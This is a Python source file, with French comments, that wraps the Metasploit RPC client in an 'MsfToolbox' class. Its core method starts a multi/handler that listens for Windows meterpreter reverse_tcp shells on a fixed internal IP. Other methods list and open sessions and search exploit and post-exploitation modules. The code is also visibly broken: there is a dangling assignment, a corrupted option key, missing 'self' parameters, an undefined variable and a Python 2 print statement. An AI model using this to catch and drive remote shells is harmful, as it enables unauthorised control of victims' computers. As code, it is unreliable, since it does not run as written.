from metasploit.msfrpc import MsfRpcClient
import os


class MsfToolbox:
	"""
    Metasploit RPC listens locally to the port by default (55553)
    msfrpcd -P mypassword -n -f -a 127.0.0.1
	# os.system("msfrpcd -P " + password + " -n -f -a 127.0.0.1")

	Paradigme de delegation pour les differents modules qui correspondent a des fonctionnalites
    """
	def __init__(addr, port = 4444):
		self._client = MsfRpcClient('mypassword', port=55553)
		self._explorer =
		self._screenshot = Screenshot(self)


    def exploit_multi_handler(self, lport=4444, lhost='172.21.42.10'):
		exploit = client.modules.use('exploit', 'multi/handler')
		pl = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
		pl['LPORT'] = lport
		pl['LHOST'] = lhost
		pl['EXITFUN'C] = 'thread'

		exploit.execute(payload=pl)


	def take_screenshot(self, path):
		self._screenshot.take_screenshot(path)


	def get_sessions(self):
		return self._client.sessions.list


	def get_session_shell(index):
		return self._client.sessions.session(1)


	def get_client(self):
	    return self._client


	def get_jobs(self):
	    return self._client.jobs.list


	def search(self, search_type, pattern):
	    search_set = { "EXPLOIT":  self._client.modules.exploits,
	                   "POST": self._client.modules.post }
	    print filter(lambda x: pattern in x, search_set[search_type])


	def is_connexion_established(self):
	    return not self._client.sessions.list
